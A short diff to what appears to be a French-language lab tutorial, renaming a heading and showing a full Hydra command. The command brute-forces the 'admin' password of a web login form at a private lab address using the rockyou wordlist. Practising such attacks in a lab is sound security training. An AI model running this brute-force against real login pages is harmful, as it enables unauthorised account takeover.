@@ -27,7 +27,7 @@ http://192.168.56.104/login.php?login=admin
 
 _____
 
-Commande sur Hydra :    
+Tutoriel commande sur Hydra :    
 
 hydra  -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.104 http-post-form "/login:username=^USER^&password=^PASS^:F=Mot de passe invalide" -V
 
